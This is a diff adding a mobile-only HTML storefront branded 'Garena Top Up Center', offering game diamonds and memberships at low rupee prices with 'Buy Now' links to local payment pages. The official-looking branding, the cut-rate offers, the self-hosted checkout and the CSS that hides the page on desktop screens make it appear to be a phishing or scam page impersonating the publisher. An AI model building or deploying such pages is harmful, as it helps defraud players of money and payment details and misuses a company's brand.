@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Top Up Center</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            /* Remove margin from the body */
+        }
+
+        /* Hide entire content on desktop */
+
+        @media (min-width: 768px) {
+            body {
+                display: none;
+            }
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: white;
+            padding: 12px 15px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+        }
+
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-right: 8px;
+        }
+
+        .logo-container img {
+            height: 35px;
+            margin-right: 5px;
+        }
+
+        .title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #333;
+            line-height: 1.2;
+        }
+
+        .profile-icon {
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            background-color: #ddd;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .profile-icon img {
+            width: 70%;
+            height: 70%;
+            opacity: 0.6;
+        }
+
+        /* Responsive image style */
+
+        .responsive-image {
+            width: 100%;
+            /* Full width */
+            display: none;
+            /* Hide by default */
+            margin-top: 50px;
+        }
+
+        /* Show image only on mobile */
+
+        @media (max-width: 768px) {
+            .responsive-image {
+                display: block;
+                /* Show on mobile */
+            }
+            .centered-image {
+                width: 95%;
+                display: block;
+                margin: 5px auto;
+                border-radius: 15px;
+                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+                transition: transform 0.2s ease, box-shadow 0.2s ease;
+                text-decoration: none;
+            }
+            .card {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                max-width: 435px;
+                width: 98%;
+                padding: 15px;
+                background: white;
+                border-radius: 12px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+                transition: transform 0.1s ease, box-shadow 0.1s ease;
+                text-decoration: none;
+                margin-left: 2px;
+            }
+            .info {
+                display: flex;
+                flex-direction: column;
+                gap: 8px;
+            }
+            .info .item {
+                display: flex;
+                align-items: center;
+                gap: 5px;
+                font-size: 18px;
+            }
+            .info .diamond {
+                color: #007bff;
+            }
+            .info .total {
+                color: #ff6347;
+            }
+            .buy-btn {
+                background-color: #ff4d4f;
+                color: white;
+                padding: 10px 15px;
+                /* Reduced left padding from 20px to 15px */
+                border: none;
+                border-radius: 8px;
+                font-size: 16px;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                gap: 10px;
+                text-decoration: none;
+                /* Ensure the link doesn't have underline */
+            }
+            .buy-btn:hover {
+                background-color: #e60023;
+            }
+            .buy-btn img {
+                width: 20px;
+                height: 20px;
+            }
+            .buy-btn svg {
+                fill: white;
+            }
+            .container {
+                max-width: 435px;
+                margin: 0 auto;
+                width: 94%;
+            }
+            h2 {
+                font-size: 1rem;
+                color: #333;
+                margin-bottom: 10px;
+                margin-top: 10px;
+                font-weight: bold;
+                text-align: left;
+            }
+            .deals-grid {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                gap: 25px;
+            }
+            .deal-card {
+                background: #ffffff;
+                border-radius: 15px;
+                padding: 0;
+                box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+                position: relative;
+                text-align: center;
+                overflow: hidden;
+                text-decoration: none;
+                color: inherit;
+                transition: transform 0.2s ease;
+            }
+            .deal-card:hover {
+                transform: translateY(-5px);
+            }
+            .deal-image {
+                width: 100%;
+                max-width: 170px;
+                margin: 0;
+            }
+            .card-background {
+                position: absolute;
+                top: -15px;
+                left: 0;
+                width: 100%;
+                height: 120px;
+                z-index: -1;
+                border-radius: 15px;
+            }
+            .green-background {
+                background-color: #FFF4F2;
+            }
+            .product-title {
+                font-size: 1rem;
+                color: #333;
+                margin-bottom: 10px;
+                font-weight: bold;
+            }
+            .price-tag {
+                position: absolute;
+                top: 10px;
+                left: 10px;
+                background-color: #ff6b6b;
+                color: white;
+                padding: 5px 10px;
+                font-size: 0.8rem;
+                font-weight: bold;
+                border-radius: 12px;
+                box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            }
+            .footer-image {
+                width: auto;
+                margin-top: 4px;
+            }
+            @media (max-width: 768px) {
+                .footer-image {
+                    width: 100%;
+                }
+            }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <div class="logo-container">
+            <div class="logo">
+                <img src="../img/LOG.png" alt="Garena Logo">
+            </div>
+            <div class="title">Official Top Up<br>Center</div>
+        </div>
+        <div class="profile-icon">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/89/Portrait_Placeholder.png" alt="User Icon">
+        </div>
+    </div>
+    <img src="../img/test.jpg" class="centered-image" alt="User Icon">
+    <div class="card">
+        <div class="info">
+            <div class="item">
+                <span class="diamond">&#x1F48E; 1350</span>
+            </div>
+            <div class="item total">
+                Total: <span>&#8377; 379</span>
+            </div>
+        </div>
+        <a href="../payment/1350.html" class="buy-btn">
+          <img src="../img/secure.png" alt="Icon">
+          <span>Buy Now</span>
+        </a>
+    </div>
+    <img src="../img/100.jpg" class="responsive-image" alt="Responsive Image">
+    <div class="container">
+        <h2>Special Deals</h2>
+        <div class="deals-grid">
+            <a href="../payment/Weekly-Membership.html" class="deal-card">
+                <div class="price-tag">₹ 60 2x</div>
+                <div class="card-background weekly-card"></div>
+                <img src="../img/wmem.png" alt="Weekly Membership" class="deal-image">
+                <h3 class="product-title">Weekly Membership</h3>
+            </a>
+            <a href="../payment/Monthly-Membership.html" class="deal-card">
+                <div class="price-tag">₹ 399 /-</div>
+                <div class="card-background monthly-card"></div>
+                <img src="../img/mmem.png" alt="Monthly Membership" class="deal-image">
+                <h3 class="product-title">Monthly Membership</h3>
+            </a>
+            <a href="../payment/Evo-14D.html" class="deal-card">
+                <div class="price-tag">₹ 60 2x</div>
+                <div class="card-background level-card"></div>
+                <img src="../img/evo30.jpg" alt="Evo Access 7D" class="deal-image">
+                <h3 class="product-title">Evo Access 14D</h3>
+            </a>
+            <a href="../payment/Evo-30D.html" class="deal-card">
+                <div class="price-tag">₹ 149 /-</div>
+                <div class="card-background evo-card"></div>
+                <img src="../img/evo7.jpg" alt="Evo Access 30D" class="deal-image">
+                <h3 class="product-title">Evo Access 30D</h3>
+            </a>
+        </div>
+    </div>
+    <footer>
+        <img src="../img/footer.jpg" alt="Footer Image" class="footer-image">
+    </footer>
+</body>
+
+</html>
